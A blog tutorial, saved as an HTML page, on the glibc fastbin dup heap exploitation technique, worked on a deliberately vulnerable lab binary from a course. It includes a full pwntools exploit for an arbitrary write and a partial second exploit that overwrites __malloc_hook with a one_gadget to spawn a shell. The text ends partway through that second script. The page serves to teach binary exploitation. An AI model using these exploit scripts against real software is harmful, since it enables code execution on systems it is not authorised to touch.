
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="http://localhost:1337/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="http://localhost:1337/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="http://localhost:1337/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Fastbins Fastbins are used to hold small freed chunks; these are implemented as a small collection of singly linked non-circular lists. There are 10 fast bins, one for each 8 multiple from 0x10 (16 bytes) up to 0x58 (88 bytes). Fastbin 1: 16 - 0x10 bytes Fastbin 2: 24 - 0x18 bytes …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Heap Journey - Fastbin Dup (Duplication)"/>
  <meta property="og:description" content="Fastbins Fastbins are used to hold small freed chunks; these are implemented as a small collection of singly linked non-circular lists. There are 10 fast bins, one for each 8 multiple from 0x10 (16 bytes) up to 0x58 (88 bytes). Fastbin 1: 16 - 0x10 bytes Fastbin 2: 24 - 0x18 bytes …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="http://localhost:1337/binary-exploitation/heap-journey/fastbin-dup.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2023-09-01 18:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
  <meta property="article:section" content="Binary Exploitation"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Heap Journey - Fastbin Dup (Duplication)</title>


</head>
<body >

<aside>
  <div>
    <a href="http://localhost:1337/">
      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="http://localhost:1337/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="http://localhost:1337/">Home</a>

  <a href="/categories.html">Categories</a>
  <a href="/category/cheatsheet.html">Cheatsheets</a>
  <a href="/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="binary-exploitation/heap-journey/fastbin-dup">Heap Journey - Fastbin Dup (Duplication)</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#fastbins" title="Fastbins">Fastbins</a><ul><li><a class="toc-href" href="#fastbin-and-free" title="Fastbin and free()">Fastbin and free()</a></li></ul></li><li><a class="toc-href" href="#fastbin-dup-techinique_1" title="Fastbin Dup Techinique">Fastbin Dup Techinique</a></li><li><a class="toc-href" href="#example-arbitrary-write" title="Example: Arbitrary Write">Example: Arbitrary Write</a></li><li><a class="toc-href" href="#example-command-exection" title="Example: Command Exection">Example: Command Exection</a></li><li><a class="toc-href" href="#targeting-the-arena-top-chunk" title="Targeting the arena Top Chunk">Targeting the arena Top Chunk</a></li></ul></div>
        </div>
    <h2 id="fastbins">Fastbins</h2>
<p><strong>Fastbins</strong> are used to hold small freed chunks; these are implemented as a small collection of singly linked non-circular lists. There are 10 fast bins, one for each 8 multiple from 0x10 (16 bytes) up to 0x58 (88 bytes).</p>
<ul>
<li><strong>Fastbin 1</strong>: 16 - 0x10 bytes</li>
<li><strong>Fastbin 2</strong>: 24 - 0x18 bytes</li>
<li><strong>Fastbin 3</strong>: 32 - 0x20 bytes</li>
<li><strong>Fastbin 4</strong>: 40 - 0x28 bytes</li>
<li><strong>Fastbin 5</strong>: 48 - 0x30 bytes</li>
<li><strong>Fastbin 6</strong>: 56 - 0x38 bytes</li>
<li><strong>Fastbin 7</strong>: 64 - 0x40 bytes</li>
<li><strong>Fastbin 8</strong>: 72 - 0x48 bytes</li>
<li><strong>Fastbin 9</strong>: 80 - 0x50 bytes</li>
<li><strong>Fastbin 10</strong>: 88 - 0x58 bytes</li>
<li><strong>Note</strong>: these sizes can change at compile-time or run-time execution.</li>
</ul>
<p>Here's a resume of (main) arena memory mappings:</p>
<p><img alt="arena-memory-mappings" src="/images/binary-exploitation/heap-journey/fastbin-dup/arena-memory.png" title="Arena Memory Mappings"/></p>
<h3 id="fastbin-and-free">Fastbin and free()</h3>
<p>Fastbins are processed with the <strong>LIFO</strong> (Last In - First Out) approach; when a chunk is freed, it's put into the respective size fastbin. It's <strong>fd_pointer</strong> will point to the previous (since it's LIFO) freed chunk while it's <strong>bck_pointer</strong> it's not used (since it's LIFO).</p>
<p><em>*Note: the first freed chunk will have a null fd_pointer</em></p>
<p><img alt="chunk-before-free" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-1.png" title="Heap Chunk before free()"/></p>
<p>After freeing the chunk, it's put into the respective size fastbin:</p>
<p><img alt="chunk-after-free" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-2.png" title="Heap Chunk after free()"/></p>
<p>Analyzing the <strong>main arena</strong> after the malloc <em>free()</em>:</p>
<p><img alt="arena-after-free" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-3.png" title="Arena after free()"/></p>
<ul>
<li>In the fastbins area (dark red rectangle), the first 8 bytes (Fastbin 1) contains the freed chunk pointer</li>
<li>The address in the blue rectangle is that of the top chunk</li>
</ul>
<p>Freeing the next chunk (of the same size of the first one):</p>
<p><img alt="second-chunk-after-free" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-4.png" title="Second Heap Chunk after free()"/></p>
<p>Analyzing the <strong>main arena</strong> after the second malloc <em>free()</em>:</p>
<p><img alt="arena-after-second-free" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-5.png" title="Arena after second free()"/></p>
<ul>
<li>The Fastbin 1 now points to the last freed chunk.</li>
</ul>
<p>The last freed chunk will hold a pointer to the previous freed chunk (in the <strong>fd_pointer</strong>); a singly linked list is constructed that way:</p>
<p><img alt="second-chunk-fwd-pointer" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-6.png" title="Last freed chunk fd_pointer"/></p>
<p><strong>When a new chunk (of the same size) is to be allocated, the allocator will pop the last freed chunks from the Fastbin.</strong></p>
<h2 id="fastbin-dup-techinique_1">Fastbin Dup Techinique</h2>
<p>The basic idea of this technique is to trick the malloc allocator by making it <em>duplicate a freed chunk into his respective fastbin</em>. This is basically done by freeing twice the same chunk. The duplicated chunk allows the attacker to perform an arbitrary read/write or even a command execution if GLIBC address is somehow leaked.
This technique works on <strong>GLIBC 2.31</strong> and below.</p>
<p>Actually, there's a GLIBC mitigation <strong>"double free or corruption (fasttop)"</strong> which prevents to use free() more the once on the top chunk into fastbin linked list since it check that <em>the chunk to be freed is not the one on top of the fastbin of its size</em>. </p>
<ul>
<li>Bypassing this mitigation consists into free the vector chunk (the one to be duplicated), then free a dummy chunk and in the end free again the vector chunk; this will create a duplicated item into the Fastbin linked list bypassing the check since, when the chunk is freed the second time, it's not the top chunk in the fastbin at that moment.</li>
</ul>
<p><img alt="fastbin-dup-bypass-1" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-dup1.png" title="Bypass double free mitigation with a dummy chunk"/></p>
<p>The duplicated chunk is now the top chunk in the fastbin, i.e, it's the next one used when a new allocation (for the same size) is requested. However, even though the duplicated chunk is allocated (removed from the fastbin), there's still an item into the fastbin linked list pointing to this chunk. </p>
<p>This vector chunk can be exploited requesting a new allocation for a chunk of the same size (i.e. removing the duplicated from the fastbin) containing the address of a target chunk; since the first 8 bytes of a <strong>freed chunk</strong> correspond to the <strong>fd_pointer</strong>, the address specified in the new allocation will be seen as a <strong>fd_pointer</strong> to a (fake) freed chunk by the fastbin since the newly allocated chunk is still pointed by an item into the linked list.</p>
<p><img alt="fastbin-dup-exploit-1" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-dup2.png" title="Weapoinze the duplicated chunk vulnerability"/></p>
<p>Actually, there's another mitigation <strong>"malloc(): memory corruption (fast)"</strong> checking whether the size field of the chunk to be allocated is the same as the fastbin size it's coming from, so <em>the target must be a chunk of the same size or an area of memory manipulable by the attacker so that it's possible to forge a fake chunk</em>.</p>
<p>Thanks to the vector chunk, now the fastbin has a <strong>fake free chunk</strong> which allows to perform an arbitrary write when requesting an allocation for a chunk of the same size that will reuse the fake chunk.</p>
<p>-*Note: since there are still other freed chunk into the fastbin, can be necessary allocating some junk chunks.</p>
<p><img alt="fastbin-dup-exploit-2" src="/images/binary-exploitation/heap-journey/fastbin-dup/fastbin-dup3.png" title="Perform an arbitrary write by exploiting the fake freed chunk"/></p>
<h2 id="example-arbitrary-write">Example: Arbitrary Write</h2>
<p>From Udemy course "Linux Heap Exploitation - Part 1", the binary <em>fastbin_dup</em> is vulnerable to this heap exploitation technique.</p>
<p>The goal is to exploit the fastbin dup technique to overwrite some target data. The binary also leaks the libc puts function address ("puts() @") which allows to perform a command execution.</p>
<blockquote>
<p>=============== |   HeapLAB   |  Fastbin Dup ===============<br/>
<br/>
puts() @ 0x7f28a0a6faf0<br/>
<br/>
Enter your username: Jack<br/>
<br/>
1) malloc 0/7<br/>
2) free<br/>
3) target<br/>
4) quit<br/>
<br/>
&gt;   </p>
</blockquote>
<p>The binary is asking for a username. Using gdb, it's possible to search for a string into some memory area by the find command;</p>
<blockquote>
<p>&gt; find &lt;start-address&gt; &lt;end-address&gt; &lt;pattern&gt;</p>
</blockquote>
<p>One way to get these boundaries is to use the command:</p>
<blockquote>
<p>&gt; info proc map<br/>
...<br/>
Mapped address spaces:<br/>
<br/>
&nbsp;&nbsp;&nbsp;&nbsp;Start Addr&nbsp;&nbsp;&nbsp;&nbsp;End Addr&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;Offset&nbsp;&nbsp;&nbsp;&nbsp;Perms&nbsp;&nbsp;&nbsp;&nbsp;objfile
&nbsp;&nbsp;&nbsp;&nbsp;0x400000&nbsp;&nbsp;&nbsp;&nbsp;0x401000&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;0x0&nbsp;&nbsp;&nbsp;&nbsp;r-xp&nbsp;&nbsp;&nbsp;&nbsp;fastbin_dup<br/>
&nbsp;&nbsp;&nbsp;&nbsp;0x601000&nbsp;&nbsp;&nbsp;&nbsp;0x602000&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;r--p&nbsp;&nbsp;&nbsp;&nbsp;fastbin_dup<br/>
&nbsp;&nbsp;&nbsp;&nbsp;<strong>0x602000</strong>&nbsp;&nbsp;&nbsp;&nbsp;<strong>0x603000</strong>&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;0x2000&nbsp;&nbsp;&nbsp;&nbsp;<strong>rw-p</strong>&nbsp;&nbsp;&nbsp;&nbsp;fastbin_dup<br/>
...  </p>
</blockquote>
<p>Since the aim is to find a string into memory which is written from a user input, using the "Start Addr" and the ""End Addr" of the proc map where "Perms" allow writing ("rw-p" in this case) should be correct.</p>
<ul>
<li>*Note: for some reason, the find command won't work using directly this value; a workaround is to increment the "Start Addr" by 0x10 and decrement the "End Addr" by 0x10. Moreover, since the string to find cames from a user input, it could have a newline "\n" char.</li>
</ul>
<blockquote>
<p>&gt; find 0x602010, 0x602990, "Jack\n"<br/>
0x602010 <strong>&lt;user&gt;</strong><br/>
1 pattern found.</p>
</blockquote>
<p>When using GEF, the search-pattern command makes it simpler:</p>
<blockquote>
<p>&gt; <strong>search-pattern</strong> "Jack\n"<br/>
...<br/>
0x602010 - 0x602016  &rarr;   "Jack\n"<br/>
<br/>
&gt; x 0x602010<br/>
0x602010 <strong>&lt;user&gt;</strong>:        0x6b63614a</p>
</blockquote>
<p>From this emerges that the <strong>user</strong> symbol is used to store the username input. It's possible to obtain more information by using the <em>ptype</em> command:</p>
<blockquote>
<p>&gt; <strong>ptype user</strong><br/>
<br/>
type = struct user {<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;char username[16];<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;char target[16];<br/>
}  </p>
</blockquote>
<p>These informations will be useful when crafting the fake free chunk; craft a fake chunk it's necessary since the target is not itself a chunk but a struct into the data area memory of the process (the "malloc(): memory corruption (fast)" would be triggered otherwise). </p>
<p>The <em>"free"</em> option of the binary seems to not be checking if a chunk has been already freed; this allows to perform multiple malloc free() on the same item. This means the binary is vulnerable to the fastbin dup technique.</p>
<blockquote>
<p>&gt;1<br/>
size: 4<br/>
data: Test<br/>
<br/>
&gt;2<br/>
index: 0<br/>
<br/>
&gt;2<br/>
index: 0<br/>
<br/>
<strong>double free or corruption (fasttop)</strong><br/>
Program received signal SIGABRT, Aborted.  </p>
</blockquote>
<p>The "double free or corruption (fasttop)" mitigation is triggered so it's necessary to bypass it with a dummy chunk.</p>
<p>The first step is to allocate the vector and the dummy chunks:</p>
<p><code>malloc(b"1", b"V") # Allocate the vector chunk</code></p>
<p><code>malloc(b"1", b"D") # Allocate a dummy chunk to bypass fastbin's top chunk duplication mitigation</code></p>
<p>Then generate the duplicate bypassing the top chunk fastbin mitigation:</p>
<p><code>free(b"0") # 1st free - vector chunk</code></p>
<p><code>free(b"1") # Free - dummy chunk</code></p>
<p><code>free(b"0") # 2nd free - vector Chunk</code></p>
<p>Now that the vector chunk is duplicated, it's time to malloc the evil chunk containing the address of the target; since the target is not a chunk (but a struct), it's necessary to trick the allocator making it think the target is a valid chunk.</p>
<p>Looking at the <em>user struct</em>, we can forge a fake free chunk by giving as input for the username a fake chunk header:</p>
<p><code>username = p64(0) + p64(0x21)</code></p>
<p>The next step is to allocate the evil chunk containing the target address:</p>
<p><code>target = p64(elf.sym.user)</code></p>
<p><code>malloc(b"8", target)</code></p>
<p>Now the vulnerability is weaponized and it's possibile to perform an arbitrary write on the target; a this moment the target is seen as a fake free chunk into the fastbin. Requesting an allocation when this fake free chunk is to be reused correspond to overwriting the target.</p>
<p><code>malloc(b"16",b"pwned\x00\x00")</code></p>
<p>The complete pwntools solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./fastbin_dup"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./fastbin_dup"</span><span class="p">)</span>
<span class="c1">#p = process("./fastbin_dup")</span>


<span class="c1"># Forge a fake chunk header to bypass "malloc(): memory corruption (fast)" mitigation since the target is not a real chunk</span>
<span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
<span class="c1">#username = b"\x00"*8 + b"\x21" + b"\x00" * 7 # Alternative without p64 pack function</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Enter your username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size: "</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:"</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Chunks"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"V"</span><span class="p">)</span> <span class="c1"># Allocate the vector chunk</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"D"</span><span class="p">)</span> <span class="c1"># Allocate a dummy chunk to bypass fastbin's top chunk duplication mitigation</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Duplicating Freed Chunk"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">)</span> <span class="c1"># 1st free - vector chunk</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span> <span class="c1"># Free - dummy chunk</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">)</span> <span class="c1"># 2nd free - vector Chunk</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Evil Chunk"</span><span class="p">)</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">user</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"8"</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span> <span class="c1"># Allocate the evil chunk: it contains the address of the target in the first 8 bytes which are seen as a fd_pointer by the fastbin since the reused chunk is still pointed by it</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Junk Chunks"</span><span class="p">)</span>
<span class="c1"># Allocate two junk chunks to remove D and V from the fastbin -&gt; only the forged fake chunk will remain in the fastbin</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"J1"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"J2"</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Write to target"</span><span class="p">)</span>
<span class="c1"># Exploit the fastbin duplication</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">b</span><span class="s2">"16"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"pwned</span><span class="se">\x00\x00</span><span class="s2">"</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="example-command-exection">Example: Command Exection</h2>
<p>To exploit this technique to perform a code execution, the libc address should be somehow leaked. </p>
<p>The target will be the malloc hooks: <a href="/binary-exploitation-heap-journey-house-of-force.html">see house of force</a></p>
<p>Even though the malloc free() is used and the malloc <strong>__free_hook</strong> might seem to be a good target for a possible command execution, since there's no control on the __free_hook previous bytes, no fake chunk can be crafted to make the mallocator write user data into the memory area pointed by __free_hook address.</p>
<ul>
<li>The "malloc(): memory corruption (fast)" mitigation would be triggered.</li>
</ul>
<p>The __malloc_hook will be used to perform the command execution; the first step is to determine libc address using the leaked puts() address:</p>
<p><code>p.recvuntil(b"puts() @ ")</code></p>
<p><code>puts_leaked_addr = int(p.recvline().strip(), 16)</code></p>
<p><code>libc_base_addr = puts_leaked_addr - libc.sym.puts</code></p>
<p>Get the __malloc_hook address:</p>
<blockquote>
<p>&gt; print &amp;__malloc_hook<br/>
<br/>
(void *(**)(size_t, const void *)) <strong>0x7f3b79db4b50</strong> &lt;__malloc_hook&gt;  </p>
</blockquote>
<p>The second step is to find a suitable <strong>"fake chunk header"</strong> the closest to the __malloc_hook address to bypass the mitigation. This can be done with GEF by using a regex finding all addresses (in a memory range) which content has the same structure as a normal chunk header; since the maximum size for a fastbin is 0x58, the search range will be from &amp;__malloc_hook - 0x58 to &amp;__malloc_hook.</p>
<blockquote>
<p>&gt; print &amp;__malloc_hook<br/>
<br/>
(void *(**)(size_t, const void *)) <strong>0x7f3b79db4b50</strong> &lt;__malloc_hook&gt;  </p>
<p>&gt; search-pattern --regex 0x7ffff7bb4890 &amp;__malloc_hook <strong>".{8}[\x01-\x7F][\x00]{7}"</strong>
<br/><br/>
&nbsp;0x7f3b79db494d - 0x7f3b79db495c  &rarr;   "b'\x00\x00\x00\xe0\x0e\xdby;\x7f\x00'..." <br/>
&nbsp;0x7f3b79db49fd - 0x7f3b79db4a0c  &rarr;   "b'\x00\x00\x00@J\xdby;\x7f\x00'..." <br/>
&nbsp;0x7f3b79db4a35 - 0x7f3b79db4a44  &rarr;   "b'\x00\x00\x00 \x14\xdby;\x7f\x00'..." <br/>
&nbsp;<strong>0x7f3b79db4b2d</strong> - 0x7f3b79db4b3c  &rarr;   "b'\x00\x00\x00\xe0\x0e\xdby;\x7f\x00'..."   </p>
</blockquote>
<p>The selected address will be the highest (the closest) to the __malloc_hook address.</p>
<blockquote>
<p>&gt; x/2gx 0x7f3b79db4b2d<br/>
<br/>
0x7f3b79db4b2d &lt;_IO_wide_data_0+237&gt;: <strong>0x3b79db0ee0000000 0x000000000000007f</strong></p>
</blockquote>
<p>This has a structure similar to a heap chunk header; to overwrite the __malloc_hook to make it point to an arbitrary function it's necessary to calculate the distance between the fake chunk header and the hook itself.</p>
<ul>
<li>*Note: It would work because malloc does not check if the flags in the last 3 bit of the size in the chunk header are valid, even though, sometimes some bytes can break things.</li>
<li>*Note: It seems that for this binary, the maximum fastbin size is 0x80; since the header size is 0x7f, all allocation must me made with a size making the allocator use the 0x70 fastbin. The size used is then 0x68.</li>
</ul>
<blockquote>
<p>&gt; print 0x7f3b79db4b50 - 0x7f3b79db4b2d<br/>
<br/>
<strong>0x23</strong></p>
</blockquote>
<p>The next step is to find a <strong>one gadget</strong>, a gadget calling <em>execve("/bin/sh", 0, 0)</em>; the one_gadget tools makes it easy:</p>
<blockquote>
<p>&gt; one_gadget ../.glibc/glibc_2.30_no-tcache/libc.so.6
...<br/>
<br/>
<strong>0xe1fa1</strong> execve("/bin/sh", rsp+0x50, environ)<br/>
constraints:<br/>
&nbsp;[rsp+0x50] == NULL  </p>
</blockquote>
<p>Having the distance between __malloc_hook and the fake chunk header, together with the one gadget, is possibile to exploit the weaponized chunk to perform a command execution; waponize the vulnerability with the evil chunk:</p>
<p><code>target = p64(libc.sym.__malloc\_hook - closest_fake_chunk_header_distance)</code></p>
<p><code>malloc(f"{0x68}".encode(), target)</code></p>
<p>Then overwrite the __malloc_hook by allocating a new chunk, making it point to the one gadget address (libc address + one_gadget found offset). Some padding can be necessary since the chunks start way up the __malloc_hook address:</p>
<p>`
gadget = libc.address + gadget_offset</p>
<p>`</p>
<p><code>padding = b"A"*0x13</code></p>
<p><code>malloc(f"{0x68}".encode(), padding + gadget)</code></p>
<p>From now, the next malloc() will trigger the hook, running the gadget and opening a shell:</p>
<blockquote>
<p>&gt;1<br/>
size: $ 1<br/>
<br/>
$ whoami<br/>
Detaching from process 538645<br/>
jack</p>
</blockquote>
<p>The complete pwntools solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./fastbin_dup"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"../.glibc/glibc_2.30_no-tcache/libc.so.6"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./fastbin_dup"</span><span class="p">)</span>
<span class="c1">#p = process("./fastbin_dup")</span>

<span class="c1"># Use leaked libc puts() address and its offset to determine libc base address</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"puts() @ "</span><span class="p">)</span>
<span class="n">puts_leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="n">puts_leaked_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base_addr</span>

<span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"Jack"</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Enter your username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size: "</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:"</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Chunks"</span><span class="p">)</span>
